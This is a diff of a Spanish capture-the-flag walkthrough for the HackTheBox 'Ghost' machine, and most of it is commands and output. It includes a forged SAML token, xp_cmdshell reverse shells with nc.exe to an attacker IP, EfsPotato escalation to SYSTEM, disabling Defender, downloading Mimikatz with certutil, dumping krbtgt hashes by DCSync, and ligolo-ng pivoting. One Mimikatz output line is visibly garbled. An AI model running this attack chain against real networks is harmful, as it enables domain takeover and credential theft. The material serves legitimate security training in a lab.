aHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjXzYwVjdTOCI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPjZRRW5ua2lVN2UvZmNpMTFZUUxkZEovZGpWeFJORGJ0a25sb1BKS05uM289PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPlJyemFnSko2Sk1SVnY0aUprYTZoV0RqTW5yQkZ3cmxsSVhIYWNLalBHOXBOa25zRmc3TlVxN2FSNWNhd3cyNnd3NGw2M1ZtOG15NjZoc2NHdzFFcHdmN2JBaVZzalNsQVN2cEptVTNNS1IxVEVNU3ZGY1VtOWF3ejIyN3NWcDNiVzQyb2FOY1R0MDNIZWYwcHhVOVNydVV4OGZGSUYwTU5BNzFUSjA3eUptZkJPK3NHY3ltSnN6S0NIalJnUmMrM08wSVcxZzZ3amY0alhLUWhmdU9Hd3RRc1JYdFdMS3o5ekp5b25ZRGRadjZoazRSb3FWdENOYlBoa0JNWGpnS2w0YmNNaHFDUkQ3eTBUVUlvWmQ3SUJRM1p6OFoySWd2TUJTQXJzQ3pEZTU3VStZT2t5Q2FFQTA0TVVaMXpodVZSRldiVW93Zkt0Q2lZMXo1SXVFOGNYQ1dMckZMWkg4a21QTWttZnA3c01jYlphQzduMGVPVkF3a29wS0c3akJwNkpzMjBTRGpvOHYyUDBTYVY3ZVdicHpBSmlXMzdKMnFydXcySXF1LzRPK0l1SFYzN0dPZlNPYUcrS0VDU3NabzdUUE1kbHd3OTh5aTFmcUF5WlRGczVaY0RJcWl4Kzk3QVdDVk9uTjJSSG1ZZDVrV3gyYVZDbWRkRTVTZzM1VHBrblJmbm9UMzFPSWtHWW9xclRqSWdUZ0RWZ1c2cHNvbUpoRXFib1Nqck5BeWtyQnF4Z2dHYWhJNHBhVHdTd1lrUVpzUEJIZ2F6VkR2dnRET1YxQy9hZmNGY2x1Y2FTTG1iTzluSDZETDVlVmFLSzNiL1hwcVEwM0FuaFd4NWdsS2ErRHdnc2tQMXVlQUgyMWxCa2hGa09lMjNmVStSdFpISzRaZExXWXdQelFZPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OnRyYW5zaWVudCI%2BR0hPU1RcYWRtaW5pc3RyYXRvcjwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI%2BPFN1YmplY3RDb25maXJtYXRpb25EYXRhIE5vdE9uT3JBZnRlcj0iMjAyNS0wMi0wN1QyMTowOToxNy4wMDBaIiBSZWNpcGllbnQ9Imh0dHBzOi8vY29yZS5naG9zdC5odGI6ODQ0My9hZGZzL3NhbWwvcG9zdFJlc3BvbnNlIi8%2BPC9TdWJqZWN0Q29uZmlybWF0aW9uPjwvU3ViamVjdD48Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMjUtMDItMDdUMjE6MDQ6MTcuMDAwWiIgTm90T25PckFmdGVyPSIyMDI1LTAyLTA3VDIyOjA0OjE3LjAwMFoiPjxBdWRpZW5jZVJlc3RyaWN0aW9uPjxBdWRpZW5jZT5odHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDM8L0F1ZGllbmNlPjwvQXVkaWVuY2VSZXN0cmljdGlvbj48L0NvbmRpdGlvbnM%2BPEF0dHJpYnV0ZVN0YXRlbWVudD48QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3VwbiI%2BPEF0dHJpYnV0ZVZhbHVlPkdIT1NUXGFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjxBdHRyaWJ1dGUgTmFtZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvY2xhaW1zL0NvbW1vbk5hbWUiPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yPC9BdHRyaWJ1dGVWYWx1ZT48L0F0dHJpYnV0ZT48L0F0dHJpYnV0ZVN0YXRlbWVudD48QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDI1LTAyLTA3VDIxOjA0OjE2LjUwMFoiIFNlc3Npb25JbmRleD0iXzYwVjdTOCI%2BPEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ%2BPC9Bc3NlcnRpb24%2BPC9zYW1scDpSZXNwb25zZT4%3D
 ```
 
-
+Añadiremos `core.ghost.htb` en nuestro archivo `/etc/hosts`
 
 ```bash
 ❯ cat /etc/hosts | grep ghost.htb
 10.10.11.24 ghost.htb dc01.ghost.htb intranet.ghost.htb federation.ghost.htb gitea.ghost.htb core.ghost.htb
 ```
 
-POST
+Interceptaremos la solicitud al acceder a [https://core.ghost.htb:8443/adfs/saml/postResponse](https://core.ghost.htb:8443/adfs/saml/postResponse), modificaremos la solicitud `GET` por `POST` e indicaremos el SAML obtenido en el paso anterior, al enviar la solicitud en `BurpSuite`, verificamos que parece que ha funcionado correctamente el `Golden SAML Attack`.
 
 <figure><img src="../../.gitbook/assets/imagen (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Haremos click derecho y trataremos de visualizar la respuesta en el navegador.
 
 <figure><img src="../../.gitbook/assets/imagen (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificaremos que se nos quedará nuestro navegador cargando en la siguiente página web.
 
 <figure><img src="../../.gitbook/assets/imagen (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+Volvemos al `BurpSuite` y de la solicitud interceptada, le daremos a la opción de `Forward`.
+
 <figure><img src="../../.gitbook/assets/imagen (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder nuevamente a nuestro navegador, comprobamos el acceso al `Ghost Config Panel`, el acceso que dispnemos con el SAML. Verificamos que se trata de una página web en la cual nos permite realizar consultas SQL.
 
 <figure><img src="../../.gitbook/assets/imagen (8) (1).png" alt=""><figcaption></figcaption></figure>
+
+Esta consulta intenta obtener el nombre de los servidores vinculados a la base de datos, seleccionando la columna `SRVNAME` de la tabla `SYSSERVERS`. Es común en SQL Server, y en un contexto de inyección SQL, un atacante podría usarla para obtener información sobre los servidores vinculados y otros detalles de la base de datos.
 
 ```sql
 SELECT+SRVNAME+FROM+SYSSERVERS
@@ -1371,7 +1414,7 @@ SELECT+SRVNAME+FROM+SYSSERVERS
 
 <figure><img src="../../.gitbook/assets/imagen (9) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Este comando intenta ejecutar código como el usuario `sa`, que es una cuenta de administrador en el sistema. Se utiliza el `EXECUTE AS LOGIN` para cambiar el contexto de ejecución al usuario `sa`, y luego se ejecuta un comando que obtiene el nombre de usuario del sistema con `SELECT SYSTEM_USER`. Esto puede ser útil para probar si se tienen privilegios elevados o para realizar acciones maliciosas con permisos elevados.
 
 ```sql
 EXECUTE('EXECUTE+AS+LOGIN+%3d+''sa''%3bSELECT+SYSTEM_USER')+AT+[PRIMARY]
@@ -1379,17 +1422,22 @@ EXECUTE('EXECUTE+AS+LOGIN+%3d+''sa''%3bSELECT+SYSTEM_USER')+AT+[PRIMARY]
 
 <figure><img src="../../.gitbook/assets/imagen (10) (1).png" alt=""><figcaption></figcaption></figure>
 
+Este comando tiene como objetivo habilitar la opción `xp_cmdshell` en SQL Server, lo que permite ejecutar comandos del sistema operativo directamente desde la base de datos. Primero, utiliza `EXEC AS LOGIN = 'sa'` para cambiar al contexto del usuario `sa`, que es el administrador del sistema. Luego, habilita las opciones avanzadas (`sp_configure "show advanced options", 1`) y habilita el uso de `xp_cmdshell` (`sp_configure "xp_cmdshell", 1`). Finalmente, ejecuta un comando del sistema operativo usando `xp_cmdshell`, en este caso, `whoami`, para obtener el nombre de usuario bajo el cual se está ejecutando el proceso.
+
+En elresultado obtenido, verificamos que el usuario que ejecuta el comando es `NT SERVICE\mssqlserver`.
+
 ```sql
 EXEC('EXEC AS LOGIN = ''sa'';EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;exec xp_cmdshell "whoami"') AT [PRIMARY]
 ```
 
 <figure><img src="../../.gitbook/assets/4602_vmware_KS76KMFfe9.png" alt=""><figcaption></figcaption></figure>
 
-
+Dado que podemos ejecutar comandos arbitrarios en el equipo, el siguiente paso será lograr obtener acceso al sistema. Para ello, dispondremos del binario de `nc.exe` el cual compartiremos a través de un servidor SMB.
 
 ```bash
 ❯ ls -l nc.exe
 .rwxr-xr-x kali kali 28 KB Fri Feb  7 22:36:05 2025  nc.exe
+
 ❯ smbserver.py smbFolder $(pwd) -username gzzcoo -password gzzcoo123 -smb2support
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -1400,34 +1448,30 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 ```
 
-
+Nos pondremos en escucha con `nc` para recibir la Reverse Shell.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Lo primero que debereos realizar, es conectar nuestro servidor SMB al equipo mediante una unidad de red, para ello haremos uso del siguiente comando. Verificaremos que se nos indica un mensaje de `The command completed successfully`.
 
 ```sql
 EXEC('EXEC+AS+LOGIN+%3d+''sa''%3bEXEC+sp_configure+"show+advanced+options",+1%3b+RECONFIGURE%3b+EXEC+sp_configure+"xp_cmdshell",+1%3b+RECONFIGURE%3bexec+xp_cmdshell+"net+use+x:+\\10.10.16.7\smbFolder+/user:gzzcoo+gzzcoo123"')+AT+[PRIMARY]
 ```
 
-
-
 <figure><img src="../../.gitbook/assets/4603_vmware_HDE8Pipx3k.png" alt=""><figcaption></figcaption></figure>
 
-
+Una vez tengamos nuestro recurso compartido en una unidad de red del equipo, lo que realizaremos es ejecutar el `nc.exe` que disponemos en nuestro servidor SMB para otorgarnos una Reverse Shell.
 
 ```sql
 EXEC('EXEC+AS+LOGIN+%3d+''sa''%3bEXEC+sp_configure+"show+advanced+options",+1%3b+RECONFIGURE%3b+EXEC+sp_configure+"xp_cmdshell",+1%3b+RECONFIGURE%3bexec+xp_cmdshell+"x:\\nc.exe+-e+cmd+10.10.16.7+443"')+AT+[PRIMARY]
 ```
 
-
-
 <figure><img src="../../.gitbook/assets/4604_vmware_aYdhZmnaoO.png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que hemos ganado acceso al equipo mediante el usuario`mssqlserver`.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
@@ -1441,18 +1485,17 @@ whoami
 nt service\mssqlserver
 ```
 
-
-
 ## Shell as SYSTEM
-
-
 
 ### Abusing SeImpersonatePrivilege (EfsPotato)
 
-```bash
+Revisando el equipo al cual disponemos acceso, verificamos que nos encontramos en un equipo distinto al del DC.
+
+```powershell
 PS C:\ProgramData> hostname
 hostname
 PRIMARY
+
 PS C:\ProgramData> ipconfig
 ipconfig
 
@@ -1468,11 +1511,9 @@ Ethernet adapter Ethernet:
 PS C:\ProgramData> 
 ```
 
+Revisando los permisos de `whoami /priv` que dispone el usuario actual, verificamos que disponemos del privilegio `SeImpersonatePrivilege` el cual nos permitiría abusar de él para convertirnos en `NT AUTHORITY\SYSTEM`.
 
-
-
-
-```bash
+```powershell
 C:\Windows\system32>whoami /priv
 whoami /priv
 
@@ -1492,11 +1533,17 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 
 
+En este caso, lo que realizaremos es abusar del privilegio menciondo a través de `EfsPotato`.
+
+{% hint style="info" %}
+EfsPotato es una herramienta de post-explotación que permite obtener privilegios elevados en sistemas Windows utilizando una vulnerabilidad en el servicio de cifrado de archivos (EFS). Aprovecha el hecho de que los procesos con privilegios más bajos pueden manipular ciertos objetos relacionados con el cifrado de archivos, lo que permite a un atacante ejecutar código con privilegios de sistema (SYSTEM). Es útil cuando un atacante tiene acceso a una cuenta con privilegios limitados, pero no cuenta con privilegios de administrador en el sistema.
+{% endhint %}
+
 {% embed url="https://github.com/zcgonvh/EfsPotato" %}
 
+En el repositorio del binario de `EfsPotato`, deberemos de compilar el binario desde el equipo. Para ello, primero revisaremos las versiones de `Microsoft.Net` que dispone el equipo víctima.
 
-
-```bash
+```powershell
 PS C:\ProgramData> dir C:\Windows\Microsoft.Net\Framework\
 dir C:\Windows\Microsoft.Net\Framework\
 
@@ -1512,18 +1559,16 @@ d-----          5/8/2021   1:15 AM                v2.0.50727
 d-----          2/7/2025   9:56 AM                v4.0.30319 
 ```
 
-
-
-
+Nos descargaremos el archivo `EfsPotato.cs` del proyecto de GitHub.
 
 ```bash
 ❯ ls -l EfsPotato.cs
 .rw-rw-r-- kali kali 25 KB Fri Feb  7 22:50:45 2025 󰌛 EfsPotato.cs
 ```
 
+Copiaremos este archivo que contiene el código fuente del binario hacia el equipo víctima.
 
-
-```bash
+```powershell
 PS C:\ProgramData> copy X:\EfsPotato.cs C:\ProgramData\EfsPotato.cs
 copy X:\EfsPotato.cs C:\ProgramData\EfsPotato.cs
 PS C:\ProgramData> ls
@@ -1545,9 +1590,9 @@ d-----          5/8/2021   1:15 AM                USOShared
 -a----          2/7/2025   1:50 PM          25441 EfsPotato.cs  
 ```
 
+Compilaremos el`EfsPotato.cs` y verificaremos que se ha creado el archivo `EfsPotato.exe`.
 
-
-```bash
+```powershell
 PS C:\ProgramData> C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
 C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
 Microsoft (R) Visual C# Compiler version 4.8.4161.0
@@ -1576,9 +1621,9 @@ d-----          5/8/2021   1:15 AM                USOShared
 -a----          2/7/2025   1:53 PM          17920 EfsPotato.exe 
 ```
 
+Por otro lado, también nos copiaremos el binario de `nc.exe` en la ruta de `C:\ProgramData`.
 
-
-```bash
+```powershell
 PS C:\ProgramData> copy x:\nc.exe C:\ProgramData\nc.exe
 copy x:\nc.exe C:\ProgramData\nc.exe
 PS C:\ProgramData> ls
@@ -1602,16 +1647,16 @@ d-----          5/8/2021   1:15 AM                USOShared
 -a----          2/7/2025   1:36 PM          28160 nc.exe  
 ```
 
-
+Nos pondremos en escucha con `nc` para recibir la Shell como `NT AUTHORITY\SYSTEM`.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 444
 listening on [any] 444 ...
 ```
 
+Ejecutaremos el `EfsPotato.exe` para convertirnos en usuario Administrador y ejecutaremos el `nc.exe` para enviarnos una Reverse Shell, este comando lo ejecutará el usuario Administrador.
 
-
-```bash
+```powershell
 PS C:\ProgramData> .\EfsPotato.exe "C:\ProgramData\nc.exe -e cmd 10.10.16.7 444"
 .\EfsPotato.exe "C:\ProgramData\nc.exe -e cmd 10.10.16.7 444"
 Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
@@ -1626,7 +1671,7 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 ==============================
 ```
 
-
+Verificamos que hemos ganado acceso al equipo que nos encontrábamos y nos hemos convertido en usuario `NT AUTHORITY\SYSTEM`.
 
 ```powershell
 ❯ rlwrap -cAr nc -nlvp 444
@@ -1640,36 +1685,35 @@ whoami
 nt authority\system
 ```
 
-
-
-
-
-## Privilege Escalation (Method 1)
-
-
-
-
-
-### Golden Ticket Attack
-
-
+Deshabilitaremos el AV (Antivirus) del equipo a través del siguiente comando.
 
 ```powershell
 PS C:\ProgramData> Set-MpPreference -DisableRealtimeMonitoring $True
 ```
 
+## Privilege Escalation (Method 1)
 
+### Golden Ticket Attack
+
+Nos encontramos en el equipo `PRIMARY`, que forma parte del dominio `CORP.GHOST.HTB`, con privilegios `NT AUTHORITY\SYSTEM`. Nuestro objetivo es escalar privilegios dentro del dominio y, para ello, utilizaremos un `Golden Ticket Attack`.
+
+Este método nos permitirá generar un ticket Kerberos válido con privilegios administrativos, otorgándonos acceso total en el dominio sin necesidad de credenciales legítimas. A lo largo del proceso, explicaremos cada paso en detalle, desde la obtención de las claves necesarias hasta la generación y uso del ticket.
+
+<figure><img src="../../.gitbook/assets/imagen (336).png" alt=""><figcaption></figcaption></figure>
+
+En este caso, deberemos de disponer del binario de `Mimikatz` en nuestro equipo, el cual compartiremos a través de un servidor web.
 
 ```bash
 ❯ ls -l mk.exe
 .rw-r--r-- kali kali 1.2 MB Fri Feb  7 22:57:17 2025  mk.exe
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Desde el equipo de `PRIMARY` nos descargaremos el binario de `Mimikatz`.
 
-
-```
+```powershell
 PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/mk.exe mk.exe
 certutil.exe -f -urlcache -split http://10.10.16.7/mk.exe mk.exe
 ****  Online  ****
@@ -1678,9 +1722,9 @@ certutil.exe -f -urlcache -split http://10.10.16.7/mk.exe mk.exe
 CertUtil: -URLCache command completed successfully.
 ```
 
+Utilizamos `mimikatz` para obtener el hash `NTLM` y el `aes256_hmac` del usuario `krbtgt`, el cual este último necesitaremos para realizar el **Golden Ticket Attack**.
 
-
-```
+```powershell
 PS C:\ProgramData> .\mk.exe "lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb" exit
 .\mk.exe "lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb"
 
@@ -1701,7 +1745,7 @@ Object RDN           : krbtgt
 ** SAM ACCOUNT **
 
 SAM Username         : krbtgt
-Account Type         : 30000000 ( USER_OBJECT )
+Account Type         : 30000000 ( USER_OBJECT )_hmac dfel usuari
 User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
 Account expiration   : 
 Password last change : 1/31/2024 6:34:01 PM
@@ -1765,84 +1809,23 @@ Supplemental Credentials:
     29  8a24eb5a1a3155556064b79149b00211
 ```
 
+Obtendremos el `Domain SID` del dominio `CORP.GHOST.HTB` a través de `BloodHound`.
 
+<figure><img src="../../.gitbook/assets/imagen (329).png" alt="" width="506"><figcaption></figcaption></figure>
 
-```bash
-PS C:\ProgramData> Get-ADDomain | Select-Object Name, DomainSID
-Get-ADDomain | Select-Object Name, DomainSID
-
-Name DomainSID                               
----- ---------                               
-corp S-1-5-21-2034262909-2733679486-179904498
-```
-
-
-
-```bash
-❯ impacket-lookupsid  ghost.htb/justin.bradley:'Qwertyuiop1234$$'@10.10.11.24 -domain-sids
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Brute forcing SIDs at 10.10.11.24
-[*] StringBinding ncacn_np:10.10.11.24[\pipe\lsarpc]
-[*] Domain SID is: S-1-5-21-4084500788-938703357-3654145966
-498: GHOST\Enterprise Read-only Domain Controllers (SidTypeGroup)
-500: GHOST\Administrator (SidTypeUser)
-501: GHOST\Guest (SidTypeUser)
-502: GHOST\krbtgt (SidTypeUser)
-512: GHOST\Domain Admins (SidTypeGroup)
-513: GHOST\Domain Users (SidTypeGroup)
-514: GHOST\Domain Guests (SidTypeGroup)
-515: GHOST\Domain Computers (SidTypeGroup)
-516: GHOST\Domain Controllers (SidTypeGroup)
-517: GHOST\Cert Publishers (SidTypeAlias)
-518: GHOST\Schema Admins (SidTypeGroup)
-519: GHOST\Enterprise Admins (SidTypeGroup)
-520: GHOST\Group Policy Creator Owners (SidTypeGroup)
-521: GHOST\Read-only Domain Controllers (SidTypeGroup)
-522: GHOST\Cloneable Domain Controllers (SidTypeGroup)
-525: GHOST\Protected Users (SidTypeGroup)
-526: GHOST\Key Admins (SidTypeGroup)
-527: GHOST\Enterprise Key Admins (SidTypeGroup)
-553: GHOST\RAS and IAS Servers (SidTypeAlias)
-571: GHOST\Allowed RODC Password Replication Group (SidTypeAlias)
-572: GHOST\Denied RODC Password Replication Group (SidTypeAlias)
-1000: GHOST\DC01$ (SidTypeUser)
-1101: GHOST\DnsAdmins (SidTypeAlias)
-1102: GHOST\DnsUpdateProxy (SidTypeGroup)
-2101: GHOST\GHOST-CORP$ (SidTypeUser)
-3601: GHOST\sysadmin (SidTypeGroup)
-3602: GHOST\kathryn.holland (SidTypeUser)
-3603: GHOST\cassandra.shelton (SidTypeUser)
-3604: GHOST\robert.steeves (SidTypeUser)
-3605: GHOST\IT (SidTypeGroup)
-3606: GHOST\florence.ramirez (SidTypeUser)
-3607: GHOST\justin.bradley (SidTypeUser)
-3608: GHOST\arthur.boyd (SidTypeUser)
-3609: GHOST\HR (SidTypeGroup)
-3610: GHOST\beth.clark (SidTypeUser)
-3611: GHOST\charles.gray (SidTypeUser)
-3612: GHOST\jason.taylor (SidTypeUser)
-3613: GHOST\principal (SidTypeGroup)
-3614: GHOST\intranet_principal (SidTypeUser)
-3615: GHOST\gitea_temp_principal (SidTypeUser)
-3630: GHOST\LINUX-DEV-WS01$ (SidTypeUser)
-```
-
-
-
-<figure><img src="../../.gitbook/assets/imagen (329).png" alt=""><figcaption></figcaption></figure>
-
-
+También obtendremos el `SID` del grupo `Enterprise Admins` del dominio `GHOST.HTB`.
 
 <figure><img src="../../.gitbook/assets/imagen (328).png" alt=""><figcaption></figcaption></figure>
 
-
+También podemos elegir otros grupos de alto privilegios que dispongan del permiso de `DCSync` sobre el dominio `GHOST.HTB`.
 
 <figure><img src="../../.gitbook/assets/imagen (11) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Exploiting Network Access with Ligolo-ng to Share corp.ghost.htb
+
+Dado que la red de `CORP.GHOST.HTB` no la tenemos accesible desde la VPN de HTB, lo que deberemos de realizar es compartir esta red mediante herramientas como `ligolo-ng`.
+
+En nuestra Kali, nos montaremos el servidor Proxy a través del siguiente comando.
 
 ```bash
 ❯ /opt/ligolo/proxy -selfcert
@@ -1864,25 +1847,26 @@ INFO[0000] Listening on 0.0.0.0:11601
 ligolo-ng »  
 ```
 
+Realizaremos las siguiente modificaciones, para habilitar la interfaz de `ligolo-ng` en nuestro equipo atacante, y de añadir la ruta correspondiente al `ip route`. Por otro lado, sincronizarmos la hora con el dominio.
 
-
-```
+```bash
 ❯ sudo ip tuntap add user kali mode tun ligolo
 ❯ sudo ip link set ligolo up
 ❯ sudo ip route add 10.0.0.0/24 dev ligolo
 ❯ sudo ntpdate -s ghost.htb
 ```
 
-
+También deberemos de disponer del `agent.exe` de `ligolo-ng` el cual compartiremos a través de un servidor web.
 
 ```bash
 ❯ ls
  agent.exe   proxy
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo de `PRIMARY` nos descargaremos el binario indicado.
 
 ```bash
 PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/agent.exe agent.exe
@@ -1893,7 +1877,7 @@ certutil.exe -f -urlcache -split http://10.10.16.7/agent.exe agent.exe
 CertUtil: -URLCache command completed successfully.
 ```
 
-
+Realizaremos la conexión del agente con el servidor de `ligolo-ng`.
 
 ```bash
 PS C:\ProgramData> .\agent.exe -connect 10.10.16.7:11601 -ignore-cert
@@ -1902,10 +1886,10 @@ time="2025-02-07T14:07:26-08:00" level=warning msg="warning, certificate validat
